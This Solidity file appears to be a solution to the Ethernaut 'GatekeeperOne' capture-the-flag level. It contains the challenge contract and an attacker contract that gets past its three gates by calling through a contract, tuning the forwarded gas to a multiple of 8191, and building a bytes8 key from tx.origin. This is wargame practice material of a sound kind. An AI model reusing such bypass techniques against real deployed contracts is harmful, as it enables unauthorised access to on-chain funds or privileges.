// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0xc6A534c8B4c18794115d43DDae5e5885dE2b729d
// goal Make it past the gatekeeper and register as an entrant to pass this level.

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);//must be called from contract
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);// gas left must be a multiple of 8191
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract test {
    uint gas = 256;
    function enter(address _gk) external {
      GatekeeperOne gk = GatekeeperOne(_gk);
      uint16 gk16 = uint16(uint160(tx.origin));
      uint64 gk64 = uint64(1 << 63) + uint64(gk16);

      //gate 3
      bytes8 gateKey = bytes8(gk64);
      gk.enter{gas: 8191*5 + gas}(gateKey);

    }

    function gateThree1(bytes8 _gateKey) external pure returns(bool) {
      return uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));
    }
    function gateThree2(bytes8 _gateKey) external pure returns(bool) {
      return uint32(uint64(_gateKey)) != uint64(_gateKey);      
    }
    function gateThree3(bytes8 _gateKey) external view returns(bool) {
      return uint32(uint64(_gateKey)) == uint16(uint160(tx.origin));
    }
}
